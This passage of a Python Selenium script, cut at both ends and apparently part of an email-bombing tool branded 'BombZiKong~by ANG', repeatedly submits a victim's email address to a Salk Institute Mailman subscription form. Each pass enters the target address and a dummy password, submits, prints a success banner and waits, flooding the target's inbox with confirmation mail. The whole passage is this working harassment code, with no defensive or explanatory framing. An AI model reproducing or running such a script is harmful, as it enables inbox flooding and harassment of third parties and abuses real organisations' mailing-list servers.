pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
